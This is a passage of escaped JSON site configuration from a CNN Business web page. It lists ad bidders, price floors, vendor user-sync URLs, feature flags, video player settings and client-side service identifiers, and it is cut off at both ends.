455750\"}},\"MOBILE\":{\"HP\":{\"btf\":\"369882\",\"atf\":\"369882\"},\"ROS\":{\"btf\":\"369882\",\"atf\":\"369882\"}},\"VIDEO\":{\"DESKTOP\":{\"HP\":{\"atf\":\"2341606\",\"btf\":\"2341606\"},\"ROS\":{\"atf\":\" 2341606\",\"btf\":\"2341606\"}},\"MOBILE\":{\"HP\":{\"atf\":\"2460344\",\"btf\":\"2460344\"},\"ROS\":{\"atf\":\"2460344\",\"btf\":\"2460344\"}}}}},\"LANGUAGE\":{\"DOM\":\"en\",\"INTL\":\"en\"},\"VIDEO\":{\"DURATION\":{\"DESKTOP\":{\"MIN\":{\"DOM\":6,\"INTL\":6},\"MAX\":{\"DOM\":30,\"INTL\":30}},\"MOBILE\":{\"MIN\":{\"DOM\":6,\"INTL\":6},\"MAX\":{\"DOM\":15,\"INTL\":15}}},\"LANGUAGE\":\"en\"}},\"PANGAEA\":{\"ACCOUNT_ID\":{\"INTL\":\"8613\",\"DOM\":0}},\"CRITEO\":{\"ACCOUNT_ID\":{\"INTL\":9264,\"DOM\":4157}},\"APPNEXUS\":{\"ACCOUNT_ID\":{\"DOM\":\"7745\",\"INTL\":\"8353\"},\"VIDEO_INVCODE\":{\"DOM\":\"cnn_homepage_video1\",\"INTL\":\"cnni_homepage_video1\"},\"PLAYBACK_METHOD\":{\"DOM\":{\"DESKTOP\":\"auto_play_sound_off\",\"MOBILE\":\"click_to_play\"},\"INTL\":{\"DESKTOP\":\"auto_play_sound_off\",\"MOBILE\":\"click_to_play\"}},\"VIDEO\":{\"DURATION\":{\"DESKTOP\":{\"MIN\":{\"DOM\":5,\"INTL\":5},\"MAX\":{\"DOM\":15,\"INTL\":15}},\"MOBILE\":{\"MIN\":{\"DOM\":6,\"INTL\":6},\"MAX\":{\"DOM\":30,\"INTL\":30}}}},\"RESERVE\":{\"DOM\":0.9,\"INTL\":0.9},\"SUPPLY_TYPE\":{\"DOM\":{\"WEB\":true,\"MOBILE_WEB\":true},\"INTL\":{\"WEB\":true,\"MOBILE_WEB\":true}},\"CONTEXT\":{\"DOM\":\"instream\",\"INTL\":\"instream\"}},\"PUBMATIC\":{\"PUBLISHER_ID\":{\"DOM\":\"162932\",\"INTL\":\"160262\"},\"MAPPINGS\":{\"DOM\":{\"DESKTOP\":{},\"MOBILE\":{}},\"INTL\":{\"DESKTOP\":{},\"MOBILE\":{}}}},\"SHARETHROUGH\":{\"UNIT_MAPPING\":{\"DOM\":{\"DESKTOP\":{},\"MOBILE\":{}},\"INTL\":{\"DESKTOP\":{},\"MOBILE\":{}}}},\"FLEDGE\":{\"BIDDERS\":[\"ix\"]}},\"TIMEOUTS\":{\"VIDEO\":{\"REFRESH\":1000,\"MIDROLL\":750,\"DEFAULT\":500},\"DISPLAY\":{\"MOBILE\":750,\"DESKTOP\":1150}},\"DEBUG\":false,\"APPROVED_BIDDERS\":{\"S2S\":{\"INTL\":[\"pangaea\",\"sharethrough\",\"ix\"],\"DOM\":[\"ix\"]},\"NATIVE\":{\"INTL\":[\"appnexus\",\"pangaea\"],\"DOM\":[\"appnexus\"]},\"CLIENT\":{\"INTL\":[\"appnexus\",\"pangaea\",\"ix\",\"rubicon\",\"sharethrough\",\"criteo\"],\"DOM\":[\"appnexus\",\"rubicon\",\"criteo\",\"ix\",\"trustx\"]}},\"BIDDERS\":{\"S2S\":{\"INTL\":[],\"DOM\":[]},\"NATIVE\":{\"INTL\":[],\"DOM\":[]},\"CLIENT\":{\"INTL\":[\"appnexus\",\"criteo\",\"ix\",\"pubmatic\",\"rubicon\"],\"DOM\":[]},\"OUTSTREAM\":{\"DOM\":[],\"INTL\":[]},\"VIDEO\":{\"DOM\":[],\"INTL\":[]}},\"FLOORS\":{\"DISPLAY\":{\"DOM\":{\"DESKTOP\":0.01,\"MOBILE\":0.01},\"INTL\":{\"DESKTOP\":0.01,\"MOBILE\":0.01}},\"VIDEO\":{\"DOM\":{\"DESKTOP\":0.01,\"MOBILE\":0.01},\"INTL\":{\"DESKTOP\":0.01,\"MOBILE\":0.01}}},\"PRICE_BUCKETS\":{\"DOM\":{\"DISPLAY\":[{\"precision\":2,\"min\":0,\"max\":5,\"increment\":0.01},{\"precision\":2,\"min\":5,\"max\":30,\"increment\":0.05},{\"precision\":2,\"min\":30,\"max\":115,\"increment\":1}],\"VIDEO\":[{\"precision\":2,\"min\":4,\"max\":50,\"increment\":1},{\"precision\":2,\"min\":50,\"max\":100,\"increment\":5}],\"OUTSTREAM\":[{\"precision\":2,\"min\":1,\"max\":50,\"increment\":1}]},\"INTL\":{\"DISPLAY\":[{\"precision\":2,\"min\":0,\"max\":5,\"increment\":0.01},{\"precision\":2,\"min\":5,\"max\":30,\"increment\":0.05},{\"precision\":2,\"min\":30,\"max\":50,\"increment\":1}],\"VIDEO\":[{\"precision\":2,\"min\":4,\"max\":50,\"increment\":1},{\"precision\":2,\"min\":50,\"max\":100,\"increment\":5}],\"OUTSTREAM\":[{\"precision\":2,\"min\":1,\"max\":50,\"increment\":1}]}},\"LIBRARY\":{\"VENDORS\":[\"appnexus\",\"criteo\",\"ix\",\"pubmatic\",\"rubicon\"],\"MODULES\":[\"categoryTranslation\",\"consentManagement\",\"prebidServerBidAdapter\",\"id5IdSystem\",\"fledgeForGpt\",\"identityLinkIdSystem\"]}},\"PROXIMIC\":{\"DEBUG\":false},\"SOURCEPOINT\":{\"DEBUG\":false},\"SSAI\":{\"VENDORS\":{\"Telaria\":{\"COOKIE_NAME\":\"goiz\",\"URL\":\"https://eq97f.publishers.tremorhub.com/pubsync?redir=https://umto.{{domain}}/user-sync?goiz=%5Btvid%5D&domain={{domain}}\"},\"Rubicon\":{\"COOKIE_NAME\":\"ifyr\",\"URL\":\"https://pixel-us-east.rubiconproject.com/exchange/sync.php?p={{brand}}\"},\"Freewheel\":{\"COOKIE_NAME\":\"bea4\",\"URL\":\"https://bea4.v.fwmrm.net/ad/u?mode=echo&cr=https://umto.{{domain}}/user-sync?bea4=#{user.id}&domain={{domain}}\"},\"AppNexus\":{\"COOKIE_NAME\":\"zwmc\",\"URL\":\"https://ib.adnxs.com/getuid?https://umto.{{domain}}/user-sync?zwmc=$UID&domain={{domain}}\"},\"PubMatic\":{\"COOKIE_NAME\":\"kfyn\",\"URL\":\"https://ads.pubmatic.com/AdServer/js/userSync.js\"},\"LiveRamp\":{\"COOKIE_NAME\":\"orev\",\"URL\":\"https://idsync.rlcdn.com/712348.gif?partner_uid=${fwuid}\"}},\"SITE_VENDORS\":[\"AppNexus\",\"Freewheel\",\"Rubicon\",\"Telaria\"],\"DEBUG\":false},\"TRANSACTION_ID\":{\"DEBUG\":false},\"USER_CONSENT\":{\"ONETRUST_SRC\":\"\",\"ONETRUST_GUID\":\"\",\"COOKIE_DOMAIN\":\"\",\"DEBUG\":false,\"ENABLED\":false},\"VERSION\":\"v2.0\",\"NAME\":\"CNN Business Edition\",\"TIMESTAMP\":[\"1\",\"723\",\"573\",\"148\",\"534\"],\"DESCRIPTION\":\"CNN Business INTL Edition\"}},\"ENABLE_RELEVANCE_USER_JS\":true,\"ENABLE_AUTO_REFRESH\":true,\"ENABLE_VIDEO_AUTOSTART_ON_ARTICLE\":false,\"ENABLE_VIDEO_AUTOSTART_ON_VIDEOLEAF\":true,\"ENABLE_VIDEO_AUTOSTART_ON_LIVESTORY\":false,\"ENABLE_AD_SLOT_CLIENT_INJECTOR\":true,\"ENABLE_ADFUEL\":true,\"ENABLE_ADFUEL_METRICS\":false,\"ENABLE_NATIVO\":true,\"ENABLE_CHARTBEAT\":true,\"ENABLE_DATADOG_TELEMETRY\":true,\"ENABLE_DUAL_NEWSLETTERS_ARKOSE\":true,\"ENABLE_EXCLUDE_FEATURES\":false,\"ENABLE_GOOGLE_TAG_MANAGER\":true,\"ENABLE_UNDERSCORED_HUMAN_BOT_CONFIG\":true,\"UNDERSCORED_HUMAN_BOT_CONFIG_SRC\":\"https://www.cnn.com/cnn-underscored/prod/init.js\",\"ENABLE_UNDERSCORED_BUTTON_SCRIPT\":true,\"ENABLE_PW_RESET_ARKOSE\":true,\"ENABLE_LIVE_STORY_UPDATES\":true,\"ENABLE_LOGIN_ARKOSE\":true,\"ENABLE_NEWSLETTERS_ARKOSE\":true,\"ENABLE_NEWSLETTERS_AUTH_ARKOSE\":false,\"ENABLE_ONE_TAP_PLAY\":true,\"ENABLE_ONE_TAP_CAROUSEL\":true,\"ENABLE_OPENWEB\":true,\"ENABLE_OPENWEB_AD\":true,\"ENABLE_OPENWEB_SSO\":true,\"ENABLE_OPENWEB_MIDPROMO\":true,\"ENABLE_PAYMENT_ARKOSE\":true,\"ENABLE_ARKOSE_DATA_EXCHANGE\":true,\"ONE_TAP_PLAYLIST_ENDPOINT\":\"https://fave.api.cnn.io/v1/video-playlist?stellarUri=\",\"ONE_TAP_EXCLUDED_COUNTRIES\":\"KR\",\"ENABLE_REGISTRATION_ARKOSE\":true,\"ENABLE_SERVER_AD_REGISTRIES\":true,\"ENABLE_SOVRN\":true,\"ENABLE_TAG_MANAGER\":true,\"ENABLE_USER_CONSENT\":true,\"ENABLE_USER_FIRST_LAST_NAME\":false,\"ENABLE_USER_FIRST_LAST_NAME_UPDATES\":true,\"ENABLE_WUNDERKIND\":false,\"ENABLE_ZETA\":true,\"ENABLE_ZION\":true,\"ENABLE_ZION_ANALYTICS_CLICK_EVENTS\":true,\"ENABLE_ZION_ANALYTICS_ON_OFF_EVENTS\":true,\"ENABLE_OUTBRAIN_MOBILE_LIVESTORY\":false,\"ENSIGHTEN_SRC\":\"https://agility.cnn.com/turner/cnn-prod/Bootstrap.js\",\"FACEBOOK_APP_ID\":\"80401312489\",\"FAVE_TOP_PLAYER\":{\"ads\":{\"default\":{\"ssai\":{\"dev\":{\"clips\":{\"enabled\":true,\"profile\":\"m6Np541neR\"},\"liveAuth\":{\"enabled\":true,\"profile\":\"UsIeS2TKlX\"},\"liveUnauth\":{\"enabled\":true,\"profile\":\"2iUzxPSeOP\"}},\"environment\":\"prod\",\"prod\":{\"clips\":{\"enabled\":true,\"profile\":\"5lycn5OPFj\"},\"liveAuth\":{\"enabled\":true,\"profile\":\"33hkbvnyaO\"},\"liveUnauth\":{\"enabled\":true,\"profile\":\"ENHa1vBbDp\"}}}},\"livestory\":{\"ssai\":{\"dev\":{\"clips\":{\"enabled\":true,\"profile\":\"N5SsGHrH8R\"},\"liveAuth\":{\"enabled\":true,\"profile\":\"UsIeS2TKlX\"},\"liveUnauth\":{\"enabled\":true,\"profile\":\"U0k3XgD9A0\"}},\"environment\":\"prod\",\"prod\":{\"clips\":{\"enabled\":true,\"profile\":\"sqKNPXeFWm\"},\"liveAuth\":{\"enabled\":true,\"profile\":\"33hkbvnyaO\"},\"liveUnauth\":{\"enabled\":true,\"profile\":\"TBn9mv6qeq\"}}}},\"espanol\":{\"ssai\":{\"environment\":\"prod\",\"prod\":{\"clips\":{\"profile\":\"vywzeUGdVg\",\"enabled\":true},\"liveUnauth\":{\"profile\":\"2VhRaN7PRN\",\"enabled\":true},\"liveAuth\":{\"enabled\":true,\"profile\":\"33hkbvnyaO\"}},\"dev\":{\"clips\":{\"enabled\":true,\"profile\":\"m6Np541neR\"},\"liveAuth\":{\"enabled\":true,\"profile\":\"UsIeS2TKlX\"},\"liveUnauth\":{\"enabled\":true,\"profile\":\"2iUzxPSeOP\"}}}}}},\"FAVE_MEDIA_PLAYER\":\"top\",\"FOLLOW_AUDIENCE\":\"reg\",\"FOLLOW_CLIENT_ID\":\"8gi02gh2jnr3hhnr3rti04hj\",\"FOLLOW_COMPONENTS_ENABLED\":[\"follow-topics-bar\",\"user-account-my-news\",\"tooltip\"],\"FOLLOW_CONTENT_API\":\"https://content.api.cnn.com\",\"FOLLOW_CONTENT_API_UDK\":\"\",\"FOLLOW_COOKIE_NAME\":\"cnn_follow_v1\",\"FOLLOW_DIGEST_ENABLED\":true,\"FOLLOW_EXCLUDE_SECTIONS\":\"cnn-underscored\",\"FOLLOW_FEATURE_ENABLED\":true,\"GIZMO_UK_SERVER_ENDPOINT\":\"/gizmo/api/1/wingman\",\"GIZMO_US_SERVER_ENDPOINT\":\"/gizmous/api/1/wingman\",\"GIZMO_UK_STRIPE_PUBLISH_KEY\":\"pk_live_51IdcnkJ8No30pLfwQoIZQCXHkAv62Y0s6hjOqbhuqOUORTluS4P1wThSRlTrh9Z78Uy41mNZWWRYrOwwKBOptyTa001tdtas8n\",\"GIZMO_US_STRIPE_PUBLISH_KEY\":\"pk_live_51JCRCzHTnkIxdQ8sdWbFCQz1ZSfrhL3mftRlw1yKy9QkCqEGfh9sCzcknZjTUT64gbQV4N3Ic0W6czHOBHeRuW8K00GE5iqhGq\",\"GIZMO_US_ENABLED\":false,\"GOOGLE_TAG_MANAGER_ID\":\"GTM-KJZD388\",\"LAZYLOAD_BUFFER_DESKTOP\":\"200\",\"LAZYLOAD_BUFFER_MOBILE\":\"400\",\"LIVE_STREAM_CENTER_ENABLED\":true,\"ONE_TRUST_SRC\":\"https://cdn.cookielaw.org/scripttemplates/otSDKStub.js\",\"OPTIMIZELY_BASE_SRC\":\"https://cdn.optimizely.com/public/125375509/s/\",\"OPTIMIZELY_ENV\":\"prod\",\"MARKETS_QUOTES_SRC\":\"https://markets.money.cnn.com/services/api/quotehover/multiquote.asp?symb=\",\"CNN_BUSINESS_API\":\"https://api.business.cnn.io\",\"CNN_BUSINESS_MONEY_HOST\":\"https://money.cnn.com\",\"MARKETS_SEARCH_SRC\":\"https://markets.money.cnn.com/common/symbolLookup/getSymbols.asp?jsoncallback=symbolSearch&callback=symbolSearch&render=JSON&q=\",\"MEDIUM_SERVICE_ENVIRONMENT\":\"prod\",\"OPENWEB_DEFAULT_SECTIONS\":[\"travel\",\"style\",\"science\",\"business\"],\"OPENWEB_LAUNCHER_SRC\":\"https://launcher.spot.im/spot/sp_hsRkxHeO\",\"OPENWEB_SSO_LAUNCHER_SRC\":\"https://launcher.spot.im/spot/sp_4hCVuB3p\",\"OPENWEB_SPOT_ID\":\"sp_hsRkxHeO\",\"OPENWEB_SSO_SPOT_ID\":\"sp_4hCVuB3p\",\"OPENWEB_PLACEMENT\":\"inline\",\"PAYWALL_ENABLED\":false,\"PRISM_APP_ID\":\"5e9f25a81c9d440000a83808\",\"PRISM_BRAND\":\"cnn\",\"PRISM_ENV\":\"prod\",\"PYMJS_SRC\":\"https://cdn.cnn.com/cnn/.e/interactive/js/lib/vendor/pym/pym.v1.min.js\",\"REGWALL_ACTIVATION_COOKIE\":\"perm_cnn_regwall_activate_v1\",\"REGWALL_ACTIVATION_METER_KEY\":\"perm_cnn_regwall_v1\",\"REGWALL_FEATURE_ENABLED\":true,\"REG_SSO_GOOGLE_ENABLED\":true,\"REG_SSO_APPLE_ENABLED\":true,\"REGWALL_STORAGE_KEY\":\"REG_WALL_METER\",\"SSO_GOOGLE_CLIENT_ID\":\"173709198955-nkj6h0ag8soarm2bpbp9pc0ulp0s5t2b.apps.googleusercontent.com\",\"SSO_GOOGLE_ID_STORAGE\":\"cnn_google_id\",\"SSO_GOOGLE_ONE_TAP_DISABLE_AUTOSIGNIN_COOKIE\":\"cnn_sso_onetap_disable_autosignin\",\"SSO_GOOGLE_ONE_TAP_ENABLED\":true,\"SSO_GOOGLE_ONE_TAP_AUTO_SIGNIN_ENABLED\":false,\"SSO_GOOGLE_SRC\":\"https://accounts.google.com/gsi/client\",\"SSO_APPLE_CLIENT_ID\":\"com.cnn.webprod\",\"SOVRN_SRC\":\"https://get.s-onetag.com/c15ddde9-ec7d-4a49-b8ca-7a21bc4b943b/tag.min.js\",\"SEARCH_API_ENDPOINT_URLS\":{\"cnn\":\"https://search.prod.di.api.cnn.io/content\",\"es\":\"https://search.stage.di.api.cnn.io/search-multilingual/language/es\"},\"SERVICE_BUILD_TYPE\":\"renderer\",\"TAG_MANAGER\":\"adobe\",\"TECH_STACK\":\"stellar2.0\",\"TOP_AD_RENDER_STICKY_TIMEOUT\":\"3000\",\"TOP_AUTH_SRC\":\"https://turnip.cdn.turner.com/top/auth/2.12.1-22/auth.min.js\",\"TOP_AUTH_ENV\":\"@top_auth_env\",\"TOP_AUTH_ECID\":\"37D8CAC3-36E0-46D9-B160-CB987896CCEF\",\"TOP_AUTH_MVPD_CONFIG_URL\":\"https://tvem.cdn.turner.com/v2/getConfig?brand=CNN&platform=web&country=US\",\"TOP_AUTH_SERVICE_APP_ID\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuZXR3b3JrIjoiY25uIiwicHJvZHVjdCI6ImNubiIsInBsYXRmb3JtIjoid2ViLXRvcDIiLCJhcHBJZCI6ImNubi1jbm4td2ViLXRvcDItOWowYnI2In0.TbUdtroeG7T1gfSTUfdobssbI8vPsAX6tFEX5KI8hcA\",\"TOP_AUTH_SOFTWARE_STATEMENT\":\"eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIyY2QwZTZiZC01ZjFlLTRhMjItYTRhMC01Njg3YzNjOWI3NTEiLCJuYmYiOjE1MzcxOTA3NTcsImlzcyI6ImF1dGguYWRvYmUuY29tIiwiaWF0IjoxNTM3MTkwNzU3fQ.tBxO0aQhj8sy6RPiDMeThvvZgBkYRNVr1VseVCV3soJZdQJO7dWCcjeNghS8Qg2pc4u7vy6MQNtABcMU25BnCEBH8xKBf4HWb49NaFQLnmdXQULpfc1Uts5_CY0ALAtMgmfEdI_lzB9a80FuEiZ4VZcGxSpy7QTgZZivBqaq9hk71Yynhik9nsCv8pcHUKBkdq5W4lMyMGbDVGlCcHepmjj3yohzyc-4_gsfqtkaJHQBBAXSSqYVTKkg6bM-1GmKm2nBhjDBTHngM3vyA0YjpZ5dVsrGkRpGdfXLnCYB_9T91h-dYV8tle_V0HiLAn_8EVOmuQmKl7BzBJlERwo8JA\",\"TOP_AUTH_SESSION_NAME\":\"com.turner.top-2.activationRegCode\",\"TOP_FREEVIEW_SRC\":\"https://turnip.cdn.turner.com/top/freeview/2.12.1-22/freeview.min.js\",\"TOP_FREEVIEW_ENV\":\"prod\",\"TOP_FREEVIEW_SECRET_KEY\":\"hhX*-sB*YqRDpgs7RFTCacJocTFarXQf\",\"PLUS_TOP_AUTH_MVPD_CONFIG_URL\":\"https://ite.api.tvemanager.ngtv.io/v2/getConfig?brand=cnnplus&platform=web&country=US\",\"EMPLOYEE_TOP_AUTH_MVPD_CONFIG_URL\":\"https://ite.api.tvemanager.ngtv.io/v2/getConfig?brand=cnnplusee&platform=web\",\"TRINITY_CONFIGURATION.domestic.michonne.features.enableMyFinance\":true,\"TRINITY_CONFIGURATION.domestic.michonne.features.enableIndexExchange\":true,\"TRINITY_CONFIGURATION.domestic.michonne.features.enablePrebid\":true,\"TRINITY_CONFIGURATION.domestic.michonne.features.enableAmazonDisplayAds\":true,\"TRINITY_CONFIGURATION.domestic.michonne.features.enableCep\":true,\"TRINITY_CONFIGURATION.domestic.michonne.features.enableIntegralAdScience\":true,\"TRINITY_CONFIGURATION.domestic.michonne.features.enableInViewRefresh\":true,\"TRINITY_CONFIGURATION.domestic.michonne.features.enableMalvertisingDetection\":true,\"TRINITY_CONFIGURATION.domestic.michonne.features.enableProximic\":true,\"TRINITY_CONFIGURATION.domestic.michonne.features.enableBlockThrough\":true,\"TRINITY_CONFIGURATION.domestic.michonne.features.enableHHID\":true,\"TRINITY_CONFIGURATION.domestic.michonne.features.enableFreewheelProgrammatic\":true,\"TRINITY_CONFIGURATION.international.michonne.features.enableMyFinance\":false,\"TRINITY_CONFIGURATION.international.michonne.features.enableIndexExchange\":false,\"TRINITY_CONFIGURATION.international.michonne.features.enablePrebid\":true,\"TRINITY_CONFIGURATION.international.michonne.features.enableAmazonDisplayAds\":true,\"TRINITY_CONFIGURATION.international.michonne.features.enableCep\":true,\"TRINITY_CONFIGURATION.international.michonne.features.enableIntegralAdScience\":true,\"TRINITY_CONFIGURATION.international.michonne.features.enableInViewRefresh\":true,\"TRINITY_CONFIGURATION.international.michonne.features.enableMalvertisingDetection\":true,\"TRINITY_CONFIGURATION.international.michonne.features.enableProximic\":true,\"TRINITY_CONFIGURATION.international.michonne.features.enableBlockThrough\":true,\"TRINITY_CONFIGURATION.international.michonne.features.enableHHID\":true,\"TRINITY_CONFIGURATION.international.michonne.features.enableFreewheelProgrammatic\":true,\"TRINITY_CONFIGURATION.siteinfo.userAccountLegalDocs\":[{\"docName\":\"TOS\",\"version\":\"1.0\",\"label\":\"By clicking Register you confirm you have read and agree to our Terms and Conditions and acknowledge our Privacy Policy.\",\"type\":\"domestic\"},{\"docName\":\"TOS-Intl\",\"version\":\"1.0\",\"label\":\"By clicking Register you confirm you have read and agree to our Terms and Conditions and acknowledge our Privacy Policy.\",\"type\":\"intl\"}],\"TRINITY_CONFIGURATION.domestic.michonne.autoStartDisabledMobileSections\":[\"world\",\"weather\",\"vr\",\"us\",\"uk\",\"tennis\",\"tech\",\"success\",\"sport\",\"politics\",\"perspectives\",\"opinions\",\"olympics\",\"movies\",\"motorsport\",\"middleeast\",\"media\",\"living\",\"investing\",\"india\",\"health\",\"golf\",\"football\",\"europe\",\"entertainment\",\"energy\",\"economy\",\"china\",\"cars\",\"business-india\",\"business\",\"australia\",\"asia\",\"africa\",\"americas\"],\"TRINITY_CONFIGURATION.international.michonne.autoStartDisabledMobileSections\":[\"world\",\"weather\",\"vr\",\"us\",\"uk\",\"tennis\",\"tech\",\"success\",\"sport\",\"politics\",\"perspectives\",\"opinions\",\"olympics\",\"movies\",\"motorsport\",\"middleeast\",\"media\",\"living\",\"investing\",\"india\",\"health\",\"golf\",\"football\",\"europe\",\"entertainment\",\"energy\",\"economy\",\"china\",\"cars\",\"business-india\",\"business\",\"australia\",\"asia\",\"africa\",\"americas\"],\"TRINITY_CONFIGURATION.domestic.michonne.video.fave\":{\"adobeAnalytics\":{\"enabled\":true},\"ads\":{\"ssai\":{\"dev\":{\"clips\":{\"profile\":\"m6Np541neR\"},\"liveAuth\":{\"profile\":\"UsIeS2TKlX\"},\"liveUnauth\":{\"profile\":\"2iUzxPSeOP\"}},\"prod\":{\"clips\":{\"profile\":\"5lycn5OPFj\"},\"liveAuth\":{\"profile\":\"33hkbvnyaO\"},\"liveUnauth\":{\"profile\":\"ENHa1vBbDp\"}}}},\"amazonA9\":{\"enabled\":true,\"refreshedTargetingData\":{\"timeout\":1000},\"targetingData\":{\"timeout\":500}},\"autoplayMuteEnabledPages\":{\"sections\":[\"business\",\"entertainment\",\"health\",\"homepage\",\"intl_homepage\",\"opinions\",\"politics\",\"us\",\"videos\",\"vr\",\"world\"]},\"chartbeat\":{\"enabled\":true},\"conviva\":{\"applicationName\":\"CNN-FAVE\",\"custom\":{\"applicationName\":\"CNN-Web\",\"applicationNameByVertical\":{\"business\":\"CNN-Web-Business\"}},\"customerKey\":\"a6709203f34992a5095d2bc7ceaf2ec504f651a8\",\"enabled\":true,\"gatewayUrl\":\"\",\"integration\":\"conviva\"},\"cssUrl\":\"https://registry.api.cnn.io/bundles/fave/latest-4.x/css\",\"enabledPageTypes\":{\"exclude\":{\"article\":[\"studentnews\"],\"section\":[\"studentnews\"],\"video\":[\"studentnews\"]}},\"enableFaveContentXml\":true,\"freewheel\":{\"globalAdTimer\":{\"adComplete\":{\"errorCode\":{\"skip\":\"SKIP_CURRENT_AD_COMPLETE\",\"stop\":\"STOP_CURRENT_AD_COMPLETE\"},\"timeout\":30000,\"type\":\"adComplete\"},\"adWaterfall\":{\"errorCode\":{\"skip\":\"SKIP_CURRENT_AD_WATERFALL\",\"stop\":\"STOP_CURRENT_AD_WATERFALL\"},\"timeout\":30000,\"type\":\"adWaterfall\"},\"enabled\":true,\"errorInfo\":{\"skip\":\"A custom global ad timeout of {timeout} milliseconds caused the skipCurrentAd() function to be invoked. Attempt {skipCurrentAdAttempts} of {maxSkipCurrentAdAttempts}. Type: {type}\",\"stop\":\"The maximum of {maxSkipCurrentAdAttempts} skip current ad attempts has been exceeded causing the stop() function to be invoked. Timeout: {timeout} milliseconds. Type: {type}.\"},\"maxSkipCurrentAdAttempts\":0}},\"iframe\":\"\",\"injectCss\":false,\"injectorJs\":{\"featureName\":\"cnn-fave-lib\",\"source\":\"https://registry.api.cnn.io/bundles/fave/latest-4.x/js\"},\"live\":{\"enabled\":true,\"enabledLiveStreams\":[\"cvplive/cvpstream0\",\"cvplive/cvpstream1\",\"cvplive/cvpstream2\",\"cvplive/cvpstream3\",\"cvplive/cvpstream4\",\"cvplive/cnngo\",\"cvplive/cnniuk\"]},\"mediaPlayer\":\"top\",\"oneTapEnabledPages\":{\"pageTypes\":[\"section\"],\"sections\":[\"homepage\",\"intl_homepage\",\"business\",\"health\",\"opinions\",\"politics\",\"us\",\"world\"]},\"oneClickEnabledPages\":{\"pageTypes\":[\"section\"],\"sections\":[\"homepage\",\"intl_homepage\"]},\"openMeasurement\":{\"enabled\":true},\"optimizely\":{\"enabled\":true},\"player\":{\"autoplay\":{\"compatibility\":{\"testMobile\":true},\"muted\":{\"desktop\":{\"enabled\":true,\"viewportChange\":{\"pauseVideoOnViewportChange\":true,\"playerInViewportPercent\":50}},\"mobile\":{\"enabled\":true,\"viewportChange\":{\"pauseVideoOnViewportChange\":true,\"playerInViewportPercent\":50}},\"unmuteCTA\":{\"variant\":{\"shrink\":false,\"wave\":false}}}},\"autoStopLive\":{\"timeout\":1200000},\"closedCaptionsOn\":false,\"closedCaptionsThreshold\":0.2,\"maxBitrate\":\"1500000\",\"message\":{\"liveOffline\":\"The live stream went offline.Player will resume on rebroadcast.\",\"error\":\"The video player encountered an error.\"},\"poster\":{\"big\":\"768x432\",\"small\":\"640x360\",\"override\":true,\"overrideImages\":{\"big\":\"medium\",\"small\":\"small\"}},\"screenOrientationManager\":{\"fullscreenOnLandscape\":true},\"stateRemembrance\":{\"closedCaptions\":{\"enabled\":true}},\"ui\":{\"theme\":{\"adCountdown\":{\"shouldRender\":false}}},\"vr\":{\"clickAndDragCta\":{\"enabled\":true}}},\"prebid\":{\"enabled\":false},\"server\":{\"medium\":{\"enabled\":true,\"environment\":\"prod\"}},\"stellar\":{\"ads\":{\"default\":{\"ssai\":{\"dev\":{\"clips\":{\"enabled\":true,\"profile\":\"m6Np541neR\"},\"liveAuth\":{\"enabled\":true,\"profile\":\"UsIeS2TKlX\"},\"liveUnauth\":{\"enabled\":true,\"profile\":\"2iUzxPSeOP\"}},\"environment\":\"prod\",\"prod\":{\"clips\":{\"enabled\":true,\"profile\":\"5lycn5OPFj\"},\"liveAuth\":{\"enabled\":true,\"profile\":\"33hkbvnyaO\"},\"liveUnauth\":{\"enabled\":true,\"profile\":\"ENHa1vBbDp\"}}}},\"fastLiveStreamDesktopWeb\":{\"ssai\":{\"dev\":{\"liveUnauth\":{\"enabled\":true,\"profile\":\"jd7CwJlXEW\"}},\"environment\":\"prod\",\"prod\":{\"liveUnauth\":{\"enabled\":true,\"profile\":\"jd7CwJlXEW\"}}}},\"fastLiveStreamMobileWeb\":{\"ssai\":{\"dev\":{\"liveUnauth\":{\"enabled\":true,\"profile\":\"JEIXPY2Q3E\"}},\"environment\":\"prod\",\"prod\":{\"liveUnauth\":{\"enabled\":true,\"profile\":\"JEIXPY2Q3E\"}}}},\"livestory\":{\"ssai\":{\"dev\":{\"clips\":{\"enabled\":true,\"profile\":\"N5SsGHrH8R\"},\"liveAuth\":{\"enabled\":true,\"profile\":\"UsIeS2TKlX\"},\"liveUnauth\":{\"enabled\":true,\"profile\":\"U0k3XgD9A0\"}},\"environment\":\"prod\",\"prod\":{\"clips\":{\"enabled\":true,\"profile\":\"sqKNPXeFWm\"},\"liveAuth\":{\"enabled\":true,\"profile\":\"33hkbvnyaO\"},\"liveUnauth\":{\"enabled\":true,\"profile\":\"TBn9mv6qeq\"}}}},\"verticalVideo\":{\"ssai\":{\"dev\":{\"clips\":{\"enabled\":true,\"profile\":\"Fak85icAsl\"}},\"environment\":\"prod\",\"prod\":{\"clips\":{\"enabled\":true,\"profile\":\"38PbsVgxaq\"}}}}},\"fastLiveStreams\":[\"livec76319f599742ab668c8b3ba6dcfed3ce7e817ad\",\"live89dc8d181af9acac4036fff1055df79a4d4ee33d\",\"live51fd6cf689647b6d6ca0bcd2d6f4e69c30dbdc49\",\"livedbcedb554833b248c3ce8374acd2bbcd3983d7dd\",\"live684f447e096731bf9a8dc4a6b1be616c565f0dc8\",\"live24770147cdbffa4a9cac306f6c56b4bf399ba4c4\"],\"mediaPlayer\":\"top\"},\"windows7PreferredFileType\":\"mp4\",\"zion\":{\"bridgeEnabled\":true,\"enabled\":true,\"enableLogging\":false,\"environment\":\"prod\"}},\"TRINITY_CONFIGURATION.international.michonne.video.fave\":{\"adobeAnalytics\":{\"enabled\":true},\"ads\":{\"ssai\":{\"dev\":{\"clips\":{\"profile\":\"TMhPsequTq\"},\"liveAuth\":{\"profile\":\"56bYhbIS7X\"},\"liveUnauth\":{\"profile\":\"56bYhbIS7X\"}},\"prod\":{\"clips\":{\"profile\":\"TMhPsequTq\"},\"liveAuth\":{\"profile\":\"56bYhbIS7X\"},\"liveUnauth\":{\"profile\":\"56bYhbIS7X\"}}}},\"amazonA9\":{\"enabled\":true,\"refreshedTargetingData\":{\"timeout\":1000},\"targetingData\":{\"timeout\":500}},\"autoplayMuteEnabledPages\":{\"sections\":[\"business\",\"entertainment\",\"health\",\"homepage\",\"intl_homepage\",\"opinions\",\"politics\",\"us\",\"videos\",\"vr\",\"world\"]},\"chartbeat\":{\"enabled\":true},\"conviva\":{\"applicationName\":\"CNN-FAVE\",\"custom\":{\"applicationName\":\"CNN-Web\",\"applicationNameByVertical\":{\"business\":\"CNN-Web-Business\"}},\"customerKey\":\"a6709203f34992a5095d2bc7c